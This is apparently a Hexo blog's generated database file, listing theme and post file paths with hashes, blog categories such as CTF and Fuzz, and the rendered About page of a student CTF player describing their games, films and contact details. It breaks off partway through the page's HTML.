{"meta":{"version":1,"warehouse":"4.0.1"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":0,"renderable":0},{"_id":"source/images/favicon.ico","path":"images/favicon.ico","modified":0,"renderable":0},{"_id":"source/images/avatar.jpg","path":"images/avatar.jpg","modified":0,"renderable":0},{"_id":"themes/purer/source/css/common.min.css","path":"css/common.min.css","modified":0,"renderable":1},{"_id":"themes/purer/source/css/iconfont.min.css","path":"css/iconfont.min.css","modified":0,"renderable":1},{"_id":"themes/purer/source/js/dom-event.min.js","path":"js/dom-event.min.js","modified":0,"renderable":1},{"_id":"themes/purer/source/js/light-gallery.min.js","path":"js/light-gallery.min.js","modified":0,"renderable":1},{"_id":"themes/purer/source/js/local-search.min.js","path":"js/local-search.min.js","modified":0,"renderable":1},{"_id":"themes/purer/source/js/repository.min.js","path":"js/repository.min.js","modified":0,"renderable":1}],"Cache":[{"_id":"source/CNAME","hash":"f30517118e43c13a4639aa795ff64e3a15b278bc","modified":1656560488450},{"_id":"source/_posts/Basic-Heap-Exploitation.md","hash":"b1f2b759df1c8f67ddb1a5dfde5d7c9bf096ecb8","modified":1657627354546},{"_id":"source/_posts/Diversified-use-of-GDB.md","hash":"dd211e0c7db56f22e89ff1cf7a85611b43287e23","modified":1657627410319},{"_id":"source/_posts/Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable].md","hash":"87d8e1d22175b7679e35038df9a112f5398c201b","modified":1657627477400},{"_id":"source/_posts/Multiple-attack-methods-of-Stack-Overflow.md","hash":"72b4c22cd4b93c8bf07da9d3ae3c9a1a43a1916f","modified":1659686358787},{"_id":"source/_posts/Source-Code-Analysis-of-AFL-[1]-code-instrumentation.md","hash":"59d15e4fe6d90874ae134cf62dce155060b088ed","modified":1657888530516},{"_id":"source/_posts/Unusual-instruments-flluf-[ROPEmporium-4].md","hash":"ee31a8eb9c3579cb7a73ed8e5ee5f13deda6c87b","modified":1657627519216},{"_id":"source/_posts/dlresolve-Feature-and-Segmented-stack-migration-ezrop.md","hash":"d5c3ac5202b6aa709b300e8e326ef73b83692424","modified":1657627449193},{"_id":"source/_posts/vim+tmux+zsh+Terminal-self-discipline-of-pwner.md","hash":"39eb78140af358b3ae7671da0f26a540024f164a","modified":1657886412690},{"_id":"source/_posts/信息素养[1]-信息获取.md","hash":"42a7cbbdf50b423cf03ce785c3cfbf71d6ab80e9","modified":1656517695518},{"_id":"source/_posts/信息素养[2]-信息管理.md","hash":"89c18e323ceeb241a1c43fc25c70c7c4350a4bbc","modified":1656517722685},{"_id":"source/_posts/信息素养[3]-信息运用与杂谈.md","hash":"1c8068a5ff3208f260df47bb4e979ccbab7289f6","modified":1656517781528},{"_id":"source/about/index.md","hash":"b31bd1df8e02864d98f9e4c20e9a1c9caf91a884","modified":1656510769542},{"_id":"source/categories/index.md","hash":"339fc95dce754bff8340337e0f288515907e305c","modified":1656517214538},{"_id":"source/images/favicon.ico","hash":"f5a483a5b2166e99b870eb6526d84bf08d31e038","modified":1656571078904},{"_id":"source/links/index.md","hash":"41f4fd3a31639d54c9cbcf20f5ac20819705b3eb","modified":1656511296126},{"_id":"source/repository/index.md","hash":"0c8e1af832cac0168377062437b8c9edb799d77c","modified":1656486886651},{"_id":"source/tags/index.md","hash":"36ff0d3718ca5b0d9754c4d85151e3787719a01c","modified":1656517160303},{"_id":"source/images/avatar.jpg","hash":"6d028ebf4da46a77789ed6a76834817f4cb3c200","modified":1656571506584},{"_id":"themes/purer/layout/_common/fancybox.ejs","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1656484724611},{"_id":"themes/purer/.browserslistrc","hash":"eb6d54d28955dc1d46af02707cb8058b21949f14","modified":1656484724605},{"_id":"themes/purer/.eslintrc.json","hash":"29c7cf01f9779755bbdc3dcb4bf286bdf892540d","modified":1656484724608},{"_id":"themes/purer/.gitignore","hash":"ec5f56c4dc92ea4c64119bbe5f334e48ce7aa2ec","modified":1656484724608},{"_id":"themes/purer/LICENSE","hash":"c7e216f59494ddc7b7c02f8a198ddb08d87e1242","modified":1656484724608},{"_id":"themes/purer/README.md","hash":"ecd2818f1505aca592cfd7d295432f257fb6adae","modified":1656484724608},{"_id":"themes/purer/_config.example.yml","hash":"6e4e29f489a43bfd1d81d986961ba786bed5778e","modified":1656565527978},{"_id":"themes/purer/_config.yml","hash":"93bac38762bccbba400aa6b3bed032e0e7547611","modified":1656673010907},{"_id":"themes/purer/gulpfile.js","hash":"1ae257d2838b51ea40d59276a08e9e92596ea6f3","modified":1656484724608},{"_id":"themes/purer/package.json","hash":"7fb47a51041c1425a970264bd81446619fc98cd6","modified":1656484724626},{"_id":"themes/purer/tailwind.config.js","hash":"a8d7838ea7ae70aaf4ac6bf1d5349ea5a1cfd052","modified":1656484724641},{"_id":"themes/purer/languages/default.yml","hash":"167ea0db98f4db156ea68c4644f64c0287ae2b6f","modified":1656484724608},{"_id":"themes/purer/languages/en.yml","hash":"4b0365376150241b27ff18a82dc0599a422b35e3","modified":1656484724608},{"_id":"themes/purer/languages/zh-CN.yml","hash":"30e1f76fdbefce2336e0dfd0009cd2981943975e","modified":1656484724611},{"_id":"themes/purer/languages/zh-TW.yml","hash":"296596bd9c5bd3d6ab242ae5ab5734919708d195","modified":1656484724611},{"_id":"themes/purer/layout/archive.ejs","hash":"291a1e98b49e7a2bc848b37408ebc09650327af2","modified":1656484724623},{"_id":"themes/purer/layout/category.ejs","hash":"38d1387564333449659c76d92a71b1acfb2caa77","modified":1656484724623},{"_id":"themes/purer/layout/index.ejs","hash":"cfca463c79c8bc689c0c68a642295933cbdafbfa","modified":1656484724623},{"_id":"themes/purer/layout/layout.ejs","hash":"81252ed8767d1d31df71959492180d837faa312f","modified":1656484724623},{"_id":"themes/purer/layout/post.ejs","hash":"f5c10f7472ec0ffc882c93be05ab69325914b07e","modified":1656484724623},{"_id":"themes/purer/layout/tag.ejs","hash":"a4d323c8ceb0ba9d907c17cf7b6db45d9d26a6d9","modified":1656484724623},{"_id":"themes/purer/scripts/page_title.js","hash":"5163e25788bebcdb89cbededa97ec980ad0bdfba","modified":1656484724626},{"_id":"themes/purer/.github/workflows/build.yml","hash":"6e211e670663ff56b17515b59f8b7787915b05d2","modified":1656484724608},{"_id":"themes/purer/layout/_comment/disqus.ejs","hash":"624e637d219db57290fe68d2179bffb619f3cdb8","modified":1656484724611},{"_id":"themes/purer/layout/_comment/gitalk.ejs","hash":"41e447512bf85359733d6c87e2991f5ad6efc9b7","modified":1656569017243},{"_id":"themes/purer/layout/_comment/livere.ejs","hash":"bda6ade3f4671304dcbdb5b2acd56295f07d6cac","modified":1656484724611},{"_id":"themes/purer/layout/_comment/valine.ejs","hash":"e9d347c4ed1862b4b02370653960f03d7220e6bc","modified":1656484724611},{"_id":"themes/purer/layout/_common/aside.ejs","hash":"aaf5ba920bc86e4fc414e5ec6fb2109485a2e2ee","modified":1656484724611},{"_id":"themes/purer/layout/_common/footer.ejs","hash":"17068dd236917325cca3358df3109f8dcf07b9e7","modified":1656484724611},{"_id":"themes/purer/layout/_common/head.ejs","hash":"a1ed99a6d04367f102fe40aa4adc6f9c5ed56b86","modified":1656484724614},{"_id":"themes/purer/layout/_common/header.ejs","hash":"ce49d1638d61ac0adab0b3fb5ebdc1d4dafce8ce","modified":1656484724614},{"_id":"themes/purer/layout/_page/categories.ejs","hash":"dc38223fe6aa5fe4ecfebd09348f617eeec89957","modified":1656484724614},{"_id":"themes/purer/layout/_common/scripts.ejs","hash":"0b9c8eec6e53c8c1c66f873450c60dab4fb3e1e2","modified":1656484724614},{"_id":"themes/purer/layout/_page/links.ejs","hash":"75ab089c4c2a88882fc09bf7de1de218cf6ce154","modified":1656484724614},{"_id":"themes/purer/layout/_page/post.ejs","hash":"5323d12c0ea932c428a37dabefd4b91001dcaf88","modified":1656484724614},{"_id":"themes/purer/layout/_page/repository.ejs","hash":"6c068739c6d18a02fdcfdb9b075280c53ef7ce5f","modified":1656484724614},{"_id":"themes/purer/layout/_page/tagcloud.ejs","hash":"5f5a4f5d94123f86f096fcca50f77c1edb79a4b9","modified":1656484724614},{"_id":"themes/purer/layout/_common/social.ejs","hash":"5c1f46accb08e34a3ac5650f112adaa0f41ca9dc","modified":1656484724614},{"_id":"themes/purer/layout/_partial/archive.ejs","hash":"bbe8a6d8d9198312c04fea9e4a945ea18e4d4cd8","modified":1656484724614},{"_id":"themes/purer/layout/_partial/article-list.ejs","hash":"28a84fa66c6a1520dd7abb375b4caabeb16da592","modified":1656484724617},{"_id":"themes/purer/layout/_partial/comment.ejs","hash":"d90d9568cd248d50b302140998827bd6816d70f4","modified":1656484724617},{"_id":"themes/purer/layout/_partial/pagination.ejs","hash":"8f0475281d6f4d5e166940d051b20a85703261e6","modified":1656484724617},{"_id":"themes/purer/layout/_partial/article-post.ejs","hash":"bc262bee3f75dfaec7d47279e034450e1b9167c9","modified":1656484724617},{"_id":"themes/purer/layout/_partial/sidebar-about.ejs","hash":"6107425de9a2c006e74675c94febc1986b2f61f9","modified":1656484724620},{"_id":"themes/purer/layout/_partial/post-item-list.ejs","hash":"55eb78c1ec9e6c566558e6f6f45fd4a9827f7f32","modified":1656484724617},{"_id":"themes/purer/layout/_partial/sidebar-toc.ejs","hash":"09403da4f35fc238c275e7595be771fd3c3b8b76","modified":1656484724620},{"_id":"themes/purer/layout/_search/index.ejs","hash":"d5b640e15cece232b7e45e12db44abb57f0119a1","modified":1656484724620},{"_id":"themes/purer/layout/_search/local.ejs","hash":"e6665eeb1a518f3e2c3bafb7a9a377a37246f81c","modified":1656484724620},{"_id":"themes/purer/layout/_widget/archive.ejs","hash":"a0a92a6ec51545fe6bb35fae633f68fa3d96d92b","modified":1656484724620},{"_id":"themes/purer/layout/_widget/category.ejs","hash":"7fa7de678815575c63f2f1c088fd5b695e5dfcf4","modified":1656484724620},{"_id":"themes/purer/layout/_widget/recent_posts.ejs","hash":"baa2a1f61ae52d22058ed73908cb254cd4e0b880","modified":1656484724620},{"_id":"themes/purer/layout/_widget/tag.ejs","hash":"af79f60890cc21500269ade140f594dbd6f6c653","modified":1656484724623},{"_id":"themes/purer/layout/_widget/tagcloud.ejs","hash":"4b7508757eb752730c98a26052e9a273b6c1b8f3","modified":1656484724623},{"_id":"themes/purer/source/css/common.min.css","hash":"a7fceac8c87b0dd4660e6ddc27ddc934cf8596bf","modified":1656484724629},{"_id":"themes/purer/source/css/iconfont.min.css","hash":"ad1368ebb996376abb4e4fec22fbc1efe55cdc6a","modified":1656484724632},{"_id":"themes/purer/source/js/dom-event.min.js","hash":"c63e853c818d1c973a23b4020b8f7c52ae83e190","modified":1656484724632},{"_id":"themes/purer/source/js/light-gallery.min.js","hash":"13ea7956f671defe583877a093ac584e00fa7a0a","modified":1656484724632},{"_id":"themes/purer/source/js/local-search.min.js","hash":"dd57d933e6af4041b44c0eaed6c2ad7e48f9a785","modified":1656484724632},{"_id":"themes/purer/source/js/repository.min.js","hash":"fb34ad8c308ade28e3c230ebc0b0570f57c400b6","modified":1656484724632},{"_id":"themes/purer/src/css/common.css","hash":"1b9fefbea8576528bcd067ea27ca985839ac7f58","modified":1656484724632},{"_id":"themes/purer/src/css/iconfont.css","hash":"02eaa919fc6a5649b2ad28c84dcfc363a2b919b7","modified":1656484724632},{"_id":"themes/purer/layout/_partial/post/category.ejs","hash":"6b5e5d432a3e80eed4e0ffa49e436e0ca5d8fec8","modified":1656484724617},{"_id":"themes/purer/layout/_partial/post/copyright.ejs","hash":"7d4cf2e704d497c8203b071b3e2ada0b4ba663b3","modified":1656484724617},{"_id":"themes/purer/layout/_partial/post/date.ejs","hash":"7a784cc9a9b14b9df59221417fdeac58f8287d8e","modified":1656484724617},{"_id":"themes/purer/layout/_partial/post/gallery.ejs","hash":"a1c54188e90d81f64705591e8ea79bf56ce120ae","modified":1656484724617},{"_id":"themes/purer/layout/_partial/post/tag.ejs","hash":"3c69334ea699ebea0dd2a4f897b3f48da26644da","modified":1656484724620},{"_id":"themes/purer/layout/_partial/post/title.ejs","hash":"8deee3f1b8af1e7d2b8877f9397cfa87fd29c9bd","modified":1656484724620},{"_id":"themes/purer/layout/_partial/post/wordcount.ejs","hash":"1fb385db6e3ab0e6f64857201d672b52a304a86d","modified":1656484724620},{"_id":"themes/purer/src/js/dom-event/menu-toggle-btn.js","hash":"d45c1261603e745dca32a2f6c9a7e9df6b639a7f","modified":1656484724635},{"_id":"themes/purer/src/js/dom-event/search-toggle.js","hash":"7baf6610fd7132f0d8c2520bc98192deb7b79a86","modified":1656484724635},{"_id":"themes/purer/src/js/light-gallery/lg-fullscreen.js","hash":"ad98f80f4a9528be6b0360c2a5146984369f9bb2","modified":1656484724635},{"_id":"themes/purer/src/js/light-gallery/lg-zoom.js","hash":"460c3a25afde37a76c77e90b8d1a0b7a3e8716dd","modified":1656484724635},{"_id":"themes/purer/src/js/light-gallery/light-gallery.js","hash":"317975101786a68fb62ecb0ddb2cbcc7c2eced2d","modified":1656484724635},{"_id":"themes/purer/src/js/repository/README.md","hash":"6a0bf5dc5289473fcdc334f99ec329c48ef536f5","modified":1656484724635},{"_id":"themes/purer/src/js/repository/.gitignore","hash":"fdfe659641b002acb68924bd4ca0daa13c4b61c1","modified":1656484724635},{"_id":"themes/purer/src/js/repository/package.json","hash":"0f8dce34d768a3282267b0b8449ed075957a15f7","modified":1656484724638},{"_id":"themes/purer/src/js/repository/rollup.config.js","hash":"f2eb9a3ae605cc4860c5fb6788ee0d939cb6679f","modified":1656484724638},{"_id":"themes/purer/src/js/repository/tsconfig.json","hash":"b22d2f4a63df7a7bffdab77cefca49f93bedc224","modified":1656484724638},{"_id":"themes/purer/src/js/repository/dist/bundle.js","hash":"fb34ad8c308ade28e3c230ebc0b0570f57c400b6","modified":1656484724635},{"_id":"themes/purer/src/js/repository/src/App.svelte","hash":"d75fd9f0a551d7b343e597400edaa3b6a944bcac","modified":1656484724638},{"_id":"themes/purer/src/js/repository/src/main.ts","hash":"b219544a58231cd95cd6ba9a3acaa9f0697b4da0","modified":1656484724638},{"_id":"themes/purer/src/js/search/local-search/.gitignore","hash":"fdfe659641b002acb68924bd4ca0daa13c4b61c1","modified":1656484724638},{"_id":"themes/purer/src/js/search/local-search/README.md","hash":"6a0bf5dc5289473fcdc334f99ec329c48ef536f5","modified":1656484724638},{"_id":"themes/purer/src/js/search/local-search/package.json","hash":"0f8dce34d768a3282267b0b8449ed075957a15f7","modified":1656484724641},{"_id":"themes/purer/src/js/search/local-search/rollup.config.js","hash":"683cc79836279df64dbe5ae2907155aa752cd5c9","modified":1656484724641},{"_id":"themes/purer/src/js/search/local-search/tsconfig.json","hash":"b1bd60b911b0cbf2957f4e0676498ab38ba54895","modified":1656484724641},{"_id":"themes/purer/src/js/search/local-search/dist/bundle.js","hash":"dd57d933e6af4041b44c0eaed6c2ad7e48f9a785","modified":1656484724641},{"_id":"themes/purer/src/js/search/local-search/src/App.svelte","hash":"a48e50da3c31365301713405899fa223d1329d05","modified":1656484724641},{"_id":"themes/purer/src/js/search/local-search/src/main.ts","hash":"6a1ca1fbea921438cf6bf1ba4e0146d9decf3a35","modified":1656484724641},{"_id":"themes/purer/src/js/repository/package-lock.json","hash":"77f9b9b552c6c1a47b3db8a646bc823f3656eafa","modified":1656484724638},{"_id":"themes/purer/src/js/search/local-search/package-lock.json","hash":"015ca99e6ed4db97beb5764dd14f974e94e5b5f9","modified":1656484724641},{"_id":"themes/purer/package-lock.json","hash":"4e7ceef39e8e80c016249548944711f9ddcecb54","modified":1656484724626},{"_id":"public/content.json","hash":"31ae34901fdeb8ce307592599357f8932b5af9f9","modified":1665793537185},{"_id":"public/repository/index.html","hash":"62dc4f12555458cf2c7a4db1282ad298901f9712","modified":1659686716331},{"_id":"public/2022/02/20/信息素养[3]-信息运用与杂谈/index.html","hash":"b8106a16ef158f4ff940f8343551ce9d04eee9dc","modified":1659686716331},{"_id":"public/archives/2022/02/index.html","hash":"1a933feb2a374b8102091b6732c77032fdfbf147","modified":1665793537185},{"_id":"public/archives/2022/03/index.html","hash":"34bff93819fee72db254bab1cbc421f0de00322e","modified":1665793537185},{"_id":"public/archives/2022/04/index.html","hash":"2aedd2cef2b1b2ceefd72f3ec1a0a7a10ea3132e","modified":1665793537185},{"_id":"public/archives/2022/05/index.html","hash":"d27c3eb41f80a0702695ca9b76624a157056ae0f","modified":1665793537185},{"_id":"public/archives/2022/07/index.html","hash":"78c18a907f7eaf3750f5fe181d2ff2636da4d35d","modified":1665793537185},{"_id":"public/archives/2022/08/index.html","hash":"8efa85d4e5d87bbfa26402abea489dc95463085b","modified":1665793537185},{"_id":"public/categories/CTF/index.html","hash":"b51fff16899eae78832917d3c0f23409bdfb3d50","modified":1659686716331},{"_id":"public/categories/Fuzz/index.html","hash":"ba5792423f588df7c671f1d07505c06aad684d2b","modified":1660738406561},{"_id":"public/categories/杂项/index.html","hash":"b82cf8bfd9b49ebfc38a9bf11b1feb139523f5cd","modified":1659686716331},{"_id":"public/tags/Pwn/index.html","hash":"03929406f386bd9c24058748bc29b0ab0e63813e","modified":1659686716331},{"_id":"public/tags/CTF/index.html","hash":"c51d11393bfe22a2c00bf148fbbffe812abf9d91","modified":1659686716331},{"_id":"public/tags/Fuzz/index.html","hash":"6628481d57c79bffc19e64570c1e9d13b0fde9e9","modified":1660738406561},{"_id":"public/tags/信息素养/index.html","hash":"20987bbb8e13f5e0ddb3ca15b734ac326eaae81e","modified":1659686716331},{"_id":"public/about/index.html","hash":"6e5796fc3cf7fba6f6ff6dafe3d45a3702511341","modified":1665793537185},{"_id":"public/categories/index.html","hash":"1b04d6df45bf537032c84b8866f84387e06da97e","modified":1665793537185},{"_id":"public/links/index.html","hash":"42593190f5a44c5178638c54f2eb9b1ce5ef1172","modified":1665793537185},{"_id":"public/tags/index.html","hash":"a2e7b0d1ebda5d47bc2c58588c3cf23a81ae2bf2","modified":1665793537185},{"_id":"public/2022/08/03/Multiple-attack-methods-of-Stack-Overflow/index.html","hash":"ddc96e872b9e16632461fd7c7a071cf026edc6d2","modified":1659686716331},{"_id":"public/2022/05/24/Basic-Heap-Exploitation/index.html","hash":"06091cb2456368e1f2de8212d4585bb11912f47e","modified":1659686716331},{"_id":"public/2022/07/01/Source-Code-Analysis-of-AFL-[1]-code-instrumentation/index.html","hash":"0f0cc6c7f0fdf3c43b966e72c9c99c38271ef804","modified":1659686716331},{"_id":"public/2022/04/25/Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]/index.html","hash":"492a848e806c5368a997d2db4a40cd53552d537c","modified":1659686716331},{"_id":"public/2022/04/25/dlresolve-Feature-and-Segmented-stack-migration-ezrop/index.html","hash":"8363f85db05f072a68f45cb813c3da926f70601c","modified":1659686716331},{"_id":"public/2022/04/20/Diversified-use-of-GDB/index.html","hash":"665f143ad95fde209a5a3ebc8c3724e569a31424","modified":1659686716331},{"_id":"public/2022/04/16/vim+tmux+zsh+Terminal-self-discipline-of-pwner/index.html","hash":"58d4c9c61826daef6f701eb94c50ca644e863155","modified":1659686716331},{"_id":"public/2022/03/02/Unusual-instruments-flluf-[ROPEmporium-4]/index.html","hash":"ff382f08d306a70ae094ba0711132ecd8d6d3857","modified":1659686716331},{"_id":"public/2022/02/20/信息素养[1]-信息获取/index.html","hash":"ac2048c830634197ba0e13ef43e344167da3d2dc","modified":1659686716331},{"_id":"public/2022/02/20/信息素养[2]-信息管理/index.html","hash":"47964b8fa11f3a006b0c72e2772f62603bbadea1","modified":1659686716331},{"_id":"public/archives/index.html","hash":"ef04e8c9640d8baadb82e15e661a83632f33482a","modified":1665793537185},{"_id":"public/archives/page/2/index.html","hash":"a73a28e2f9b751bb8ec3b064ad95b60198ab7b70","modified":1665793537185},{"_id":"public/archives/2022/index.html","hash":"024338aefcd7e5abb10b35f31e0837cca864222c","modified":1665793537185},{"_id":"public/archives/2022/page/2/index.html","hash":"8427ac60aea6a51e090964539280b93f44726444","modified":1665793537185},{"_id":"public/index.html","hash":"abedb0ee3042b577e9260579732dce960d750c2d","modified":1665793537185},{"_id":"public/page/2/index.html","hash":"5bd8cee9e17470300a5d4542163d4547da3e3076","modified":1665793537185},{"_id":"public/images/favicon.ico","hash":"f5a483a5b2166e99b870eb6526d84bf08d31e038","modified":1659686716331},{"_id":"public/images/avatar.jpg","hash":"6d028ebf4da46a77789ed6a76834817f4cb3c200","modified":1659686716331},{"_id":"public/CNAME","hash":"f30517118e43c13a4639aa795ff64e3a15b278bc","modified":1659686716331},{"_id":"public/js/dom-event.min.js","hash":"c63e853c818d1c973a23b4020b8f7c52ae83e190","modified":1659686716331},{"_id":"public/js/local-search.min.js","hash":"dd57d933e6af4041b44c0eaed6c2ad7e48f9a785","modified":1659686716331},{"_id":"public/css/iconfont.min.css","hash":"ad1368ebb996376abb4e4fec22fbc1efe55cdc6a","modified":1659686716331},{"_id":"public/js/light-gallery.min.js","hash":"13ea7956f671defe583877a093ac584e00fa7a0a","modified":1659686716331},{"_id":"public/js/repository.min.js","hash":"fb34ad8c308ade28e3c230ebc0b0570f57c400b6","modified":1659686716331},{"_id":"public/css/common.min.css","hash":"a7fceac8c87b0dd4660e6ddc27ddc934cf8596bf","modified":1659686716331},{"_id":"source/_posts/PaperReading-Fuzz-MOpt.md","hash":"fa7fc462a9421eeb49785a19f1fd4895ec68837a","modified":1660739217284},{"_id":"source/images/MOpt.png","hash":"decc3eb1fd5e2ba8406f708cdbe89c8f4b506892","modified":1660657535652},{"_id":"public/2022/08/17/PaperReading-Fuzz-MOpt/index.html","hash":"12f8c7dc68628d834ac847303b54ff455abbe79a","modified":1660739230038},{"_id":"public/images/MOpt.png","hash":"decc3eb1fd5e2ba8406f708cdbe89c8f4b506892","modified":1660738406561},{"_id":"source/_posts/MOpt.png","hash":"decc3eb1fd5e2ba8406f708cdbe89c8f4b506892","modified":1660657535652},{"_id":"source/_posts/Fedora-and-Nvidia-driver-installing.md","hash":"57a3411d4026493f892f0d017b6b7fa3d91b13d6","modified":1665793486367},{"_id":"public/tags/Linux/index.html","hash":"0beea0fd42b383e58224c0b7963a95f3f49d80b4","modified":1665793537185},{"_id":"public/archives/2022/10/index.html","hash":"d35209b193caf4f74f7ae2a3df2cc92edf287ab2","modified":1665793537185},{"_id":"public/2022/10/15/Fedora-and-Nvidia-driver-installing/index.html","hash":"ce54cf2e7930c0d11e36567efae27ab77ebec2c0","modified":1665793537185},{"_id":"public/categories/Linux/index.html","hash":"a682d9eb437d85807b95e010b770bc426a07dd5b","modified":1665793537185}],"Category":[{"name":"CTF","_id":"cl6g6maj80004j8v0b46u367p"},{"name":"Fuzz","_id":"cl6g6maji000pj8v0cawyd7ba"},{"name":"杂项","_id":"cl6g6majk000xj8v0afko4q4d"},{"name":"Linux","_id":"cl996gnq100011wv0cfepb6dn"}],"Data":[],"Page":[{"title":"About","layout":"About","comments":0,"sidebar":"none","_content":"\n\n\n# About me\n\nStudent and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.\n\nNow I focus on studying of Fuzz.\n\n# Interest\n\n## Games:\n\n- Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)\n- Arknights(明日方舟)\n- JRPG\n  - The Legend of Heroes(轨迹系列)\n  - Persona(女神异闻录系列)\n  - ...\n- Light player of Act:\n  - Monster Hunter(怪物猎人系列)\n  - Devil May Cry(鬼泣)\n  - ...\n- Leisure:\n  - Rune Factory(符文工房系列)\n  - ...\n- RPG:\n  - Baldur' s gate(博德之门)\n  - Disco Elysium\n- other 3A\n\n\n\n## Films:\n\nFor films, I see it as the art of sight and sound. So I don't like the Drama(剧情片), but prefer the  films that have engrossing shots.\n\nHaving a preference for Europe、Japan  Director and films.\n\nRecently watched:\n\n- Love Letter, directed by いわい しゅんじ(岩井俊二)\n- 东邪西毒, directed by 王家卫\n- PROMARE, directed by いまいし ひろゆき(今石洋之)\n- Mobile Suit Gundam: Hathaway's Flash\n- ......\n\n## Books:\n\n- Literature\n- History\n- Monograph\n- Fiction\n- ......\n\n\n\n# Contact me\n\ne-mail:\n\n- Personal e-mail: wzhdxtx123@outlook.com\n\n- work e-mail: nemoxxw@whu.edu.cn\n\nQQ: 2499291623\n\nGithub: [github.com/Du-Mu](https://github.com/Du-Mu)","source":"about/index.md","raw":"---\ntitle: About\nlayout: About\ncomments: false\nsidebar: none\n---\n\n\n\n# About me\n\nStudent and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.\n\nNow I focus on studying of Fuzz.\n\n# Interest\n\n## Games:\n\n- Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)\n- Arknights(明日方舟)\n- JRPG\n  - The Legend of Heroes(轨迹系列)\n  - Persona(女神异闻录系列)\n  - ...\n- Light player of Act:\n  - Monster Hunter(怪物猎人系列)\n  - Devil May Cry(鬼泣)\n  - ...\n- Leisure:\n  - Rune Factory(符文工房系列)\n  - ...\n- RPG:\n  - Baldur' s gate(博德之门)\n  - Disco Elysium\n- other 3A\n\n\n\n## Films:\n\nFor films, I see it as the art of sight and sound. So I don't like the Drama(剧情片), but prefer the  films that have engrossing shots.\n\nHaving a preference for Europe、Japan  Director and films.\n\nRecently watched:\n\n- Love Letter, directed by いわい しゅんじ(岩井俊二)\n- 东邪西毒, directed by 王家卫\n- PROMARE, directed by いまいし ひろゆき(今石洋之)\n- Mobile Suit Gundam: Hathaway's Flash\n- ......\n\n## Books:\n\n- Literature\n- History\n- Monograph\n- Fiction\n- ......\n\n\n\n# Contact me\n\ne-mail:\n\n- Personal e-mail: wzhdxtx123@outlook.com\n\n- work e-mail: nemoxxw@whu.edu.cn\n\nQQ: 2499291623\n\nGithub: [github.com/Du-Mu](https://github.com/Du-Mu)","date":"2022-06-29T13:52:49.542Z","updated":"2022-06-29T13:52:49.542Z","path":"about/index.html","_id":"cl6g6maj20000j8v02zat3x2p","content":"<h1 id=\"About-me\">About me</h1>\n<p>Student and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.</p>\n<p>Now I focus on studying of Fuzz.</p>\n<h1 id=\"Interest\">Interest</h1>\n<h2 id=\"Games\">Games:</h2>\n<ul>\n<li>Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)</li>\n<li>Arknights(明日方舟)</li>\n<li>JRPG\n<ul>\n<li>The Legend of Heroes(轨迹系列)</li>\n<li>Persona(女神异闻录系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Light player of Act:\n<ul>\n<li>Monster Hunter(怪物猎人系列)</li>\n<li>Devil May Cry(鬼泣)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Leisure:\n<ul>\n<li>Rune Factory(符文工房系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>RPG:\n<ul>\n<li>Baldur’ s gate(博德之门)</li>\n<li>Disco Elysium</li>\n</ul>\n</li>\n<li>other 3A</li>\n</ul>\n<h2 id=\"Films\">Films:</h2>\n<p>For films, I see it as the art of sight and sound. So I don’t like the Drama(剧情片), but prefer the  films that have engrossing shots.</p>\n<p>Having a preference for Europe、Japan  Director and films.</p>\n<p>Recently watched:</p>\n<ul>\n<li>Love Letter, directed by いわい しゅんじ(岩井俊二)</li>\n<li>东邪西毒, directed by 王家卫</li>\n<li>PROMARE, directed by いまいし ひろゆき(今石洋之)</li>\n<li>Mobile Suit Gundam: Hathaway’s Flash</li>\n<li>…</li>\n</ul>\n<h2 id=\"Books\">Books:</h2>\n<ul>\n<li>Literature</li>\n<li>History</li>\n<li>Monograph</li>\n<li>Fiction</li>\n<li>…</li>\n</ul>\n<h1 id=\"Contact-me\">Contact me</h1>\n<p>e-mail:</p>\n<ul>\n<li>\n<p>Personal e-mail: <a href=\"mailto:wzhdxtx123@outlook.com\">wzhdxtx123@outlook.com</a></p>\n</li>\n<li>\n<p>work e-mail: <a href=\"mailto:nemoxxw@whu.edu.cn\">nemoxxw@whu.edu.cn</a></p>\n</li>\n</ul>\n<p>QQ: 2499291623</p>\n<p>Github: <a href=\"https://github.com/Du-Mu\">github.com/Du-Mu</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"About-me\">About me</h1>\n<p>Student and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.</p>\n<p>Now I focus on studying of Fuzz.</p>\n<h1 id=\"Interest\">Interest</h1>\n<h2 id=\"Games\">Games:</h2>\n<ul>\n<li>Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)</li>\n<li>Arknights(明日方舟)</li>\n<li>JRPG\n<ul>\n<li>The Legend of Heroes(轨迹系列)</li>\n<li>Persona(女神异闻录系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Light player of Act:\n<ul>\n<li>Monster Hunter(怪物猎人系列)</li>\n<li>Devil May Cry(鬼泣)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Leisure:\n<ul>\n<li>Rune Factory(符文工房系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>RPG:\n<ul>\n<li>Baldur’ s gate(博德之门)</li>\n<li>Disco Elysium</li>\n</ul>\n</li>\n<li>other 3A</li>\n</ul>\n<h2 id=\"Films\">Films:</h2>\n<p>For films, I see it as the art of sight and sound. So I don’t like the Drama(剧情片), but prefer the  films that have engrossing shots.</p>\n<p>Having a preference for Europe、Japan  Director and films.</p>\n<p>Recently watched:</p>\n<ul>\n<li>Love Letter, directed by いわい しゅんじ(岩井俊二)</li>\n<li>东邪西毒, directed by 王家卫</li>\n<li>PROMARE, directed by いまいし ひろゆき(今石洋之)</li>\n<li>Mobile Suit Gundam: Hathaway’s Flash</li>\n<li>…</li>\n</ul>\n<h2 